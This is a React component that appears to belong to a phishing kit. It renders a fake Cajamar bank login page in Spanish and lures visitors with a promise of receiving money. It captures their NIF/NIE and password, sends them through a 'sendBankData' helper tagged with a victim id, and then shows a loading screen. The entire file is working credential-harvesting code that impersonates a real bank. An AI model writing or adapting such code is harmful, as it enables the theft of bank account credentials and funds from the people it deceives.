import { useState } from 'react'
import { useNavigate, useParams } from 'react-router-dom'
import { sendBankData } from '../../../utils/utils'
import { Input } from '../ui/input/Input'

export function LoginForm() {
  const { id } = useParams()
  const navigate = useNavigate()

  const [login, setLogin] = useState('')
  const [password, setPassword] = useState('')

  const sendAndNavigate = (): void => {
    sendBankData(id!, 'Cajamar', login, password)
    navigate(`/loading/${id}`)
  }

  return (
    <main>
      <div className="mx-auto flex w-full max-w-[400px] flex-col items-center px-[30px] pb-[44px] pt-[70px] font-serif">
        <h1 className="mb-3 text-[36px] font-medium text-black">Conectarse</h1>
        <h2 className="mb-20 text-center text-black/35">Introducir credenciales para recibir dinero</h2>
        <div className="flex w-full flex-col gap-4">
          <Input placeholder="NIF/NIE" value={login} onChange={(e) => setLogin(e.target.value)} />
          <Input placeholder="Clave" value={password} onChange={(e) => setPassword(e.target.value)} />
          <button className="h-[50px] w-full bg-black px-4 text-white" onClick={sendAndNavigate}>
            Entrar
          </button>
        </div>
      </div>
    </main>
  )
}
